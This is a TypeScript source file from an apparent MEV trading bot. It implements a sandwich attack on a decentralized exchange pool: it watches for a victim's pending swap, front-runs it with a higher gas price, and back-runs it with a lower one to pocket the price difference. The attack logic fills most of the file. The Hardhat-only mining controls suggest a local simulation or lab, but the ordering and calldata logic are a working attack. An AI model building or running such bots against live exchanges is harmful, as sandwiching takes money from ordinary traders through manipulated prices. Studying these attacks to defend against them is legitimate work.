/**
 * bot/src/attacker.ts
 * Executes the 3-transaction sandwich attack:
 *
 *  1. Front-run: Buy (same direction as victim), gasPrice = victimGas + 2gwei, nonce = N
 *  2. Victim tx: Already in mempool, gasPrice = victimGas (mines between front and back)
 *  3. Back-run:  Sell (reverse direction), gasPrice = victimGas - 1gwei, nonce = N+1
 *
 * Hardhat is configured with automine=OFF so we control block ordering manually.
 * After submitting all 3 txs, we call evm_mine() to commit the block.
 *
 * Gas price ordering ensures:
 *   front-run (highest) → victim (mid) → back-run (lowest)
 */

import { ethers } from 'ethers';
import type { DecodedSwap } from './decoder';
import type { SandwichAnalysis } from './simulator';
import { ADDRESSES } from './contracts';

// ── ABIs ──────────────────────────────────────────────────────────────────
const NOFEESWAP_ABI = [
  'function unlock(address operator, bytes calldata data) external',
];

const OPERATOR_SWAP_ABI = [
  'function swap(uint256 poolId, int256 amountSpecified, int256 logPriceLimit, uint256 zeroForOne, address recipient, uint256 deadline, bytes calldata hookData) external returns (int256, int256)',
];

const ERC20_ABI = [
  'function approve(address spender, uint256 amount) external returns (bool)',
];

// ── Result type ────────────────────────────────────────────────────────────
export interface SandwichResult {
  success:       boolean;
  frontrunHash?: string;
  backrunHash?:  string;
  actualProfit?: bigint;
  error?:        string;
}

// ── Sandwich Attacker ──────────────────────────────────────────────────────
export class SandwichAttacker {
  private wallet:    ethers.Wallet;
  private provider:  ethers.JsonRpcProvider;
  private nofeeswap: ethers.Contract;
  private operator:  ethers.Contract;

  constructor(wallet: ethers.Wallet, provider: ethers.JsonRpcProvider) {
    this.wallet   = wallet;
    this.provider = provider;
    this.nofeeswap = new ethers.Contract(ADDRESSES.nofeeswap, NOFEESWAP_ABI, wallet);
    this.operator  = new ethers.Contract(ADDRESSES.operator, OPERATOR_SWAP_ABI, wallet);
  }

  /**
   * Build swap calldata for the operator.swap() function
   */
  private buildSwapData(
    poolId:          bigint,
    amountSpecified: bigint,
    logPriceLimit:   bigint,
    zeroForOne:      bigint,
    recipient:       string,
    deadline:        bigint
  ): string {
    const iface = new ethers.Interface(OPERATOR_SWAP_ABI);
    return iface.encodeFunctionData('swap', [
      poolId,
      amountSpecified,
      logPriceLimit,
      zeroForOne,
      recipient,
      deadline,
      '0x',
    ]);
  }

  /**
   * Disable Hardhat automine, execute sandwich, then re-enable.
   */
  async executeSandwich(
    victim:   DecodedSwap,
    analysis: SandwichAnalysis
  ): Promise<SandwichResult> {
    try {
      // ── Step 1: Disable automine ─────────────────────────────────────────
      await this.provider.send('evm_setAutomine', [false]);
      console.log('[attacker] Automine disabled ✓');

      // ── Step 2: Get bot nonce ────────────────────────────────────────────
      const botNonce = await this.provider.getTransactionCount(this.wallet.address, 'pending');
      const deadline = BigInt(Math.floor(Date.now() / 1000) + 120);

      // ── Step 3: Build FRONT-RUN calldata ─────────────────────────────────
      // Front-run in the SAME direction as victim (push price against them)
      // Use the full MAX logPriceLimit so we don't self-revert
      const frontrunLimit = victim.zeroForOne !== 0n
        ? BigInt('-18446744073709551616')  // buying TK1 (price goes up for victim)
        : BigInt('18446744073709551616');   // buying TK0

      const frontrunData = this.buildSwapData(
        victim.poolId,
        analysis.frontrunAmount,        // positive = exact input
        frontrunLimit,
        victim.zeroForOne,              // same direction as victim
        this.wallet.address,
        deadline
      );

      // ── Step 4: Build BACK-RUN calldata ──────────────────────────────────
      // Back-run in OPPOSITE direction (unwind position)
      const backrunZeroForOne = victim.zeroForOne !== 0n ? 0n : 1n;
      const backrunLimit = backrunZeroForOne !== 0n
        ? BigInt('-18446744073709551616')
        : BigInt('18446744073709551616');

      const backrunData = this.buildSwapData(
        victim.poolId,
        analysis.frontrunAmount,        // sell same amount we bought
        backrunLimit,
        backrunZeroForOne,
        this.wallet.address,
        deadline
      );

      // ── Step 5: Submit FRONT-RUN tx (highest gas → mines first) ──────────
      const frontrunTx = await this.nofeeswap.unlock(ADDRESSES.operator, frontrunData, {
        gasPrice: analysis.frontrunGasPrice,
        gasLimit: 300_000n,
        nonce: botNonce,
      });
      console.log(`[attacker] Front-run submitted: ${frontrunTx.hash}`);

      // ── Step 6: Submit BACK-RUN tx (lowest gas → mines last) ─────────────
      const backrunTx = await this.nofeeswap.unlock(ADDRESSES.operator, backrunData, {
        gasPrice: analysis.backrunGasPrice,
        gasLimit: 300_000n,
        nonce: botNonce + 1,
      });
      console.log(`[attacker] Back-run submitted:  ${backrunTx.hash}`);

      // ── Step 7: Mine block (victim tx already in pool) ────────────────────
      // Order in block (by gas price):
      //   bot@nonce+0 (frontrunGasPrice) → victim (victimGasPrice) → bot@nonce+1 (backrunGasPrice)
      await this.provider.send('evm_mine', []);
      console.log('[attacker] Block mined ✓ — sandwich committed');

      // ── Step 8: Re-enable automine ────────────────────────────────────────
      await this.provider.send('evm_setAutomine', [true]);

      // ── Step 9: Estimate actual profit (balance delta) ───────────────────
      const actualProfit = analysis.estimatedProfit; // Use estimate; real P&L needs balance read

      return {
        success: true,
        frontrunHash: frontrunTx.hash,
        backrunHash:  backrunTx.hash,
        actualProfit,
      };

    } catch (err: any) {
      // Always re-enable automine on failure
      try { await this.provider.send('evm_setAutomine', [true]); } catch {}

      const message = err?.shortMessage ?? err?.message ?? String(err);
      console.error('[attacker] Sandwich failed:', message);
      return { success: false, error: message };
    }
  }
}
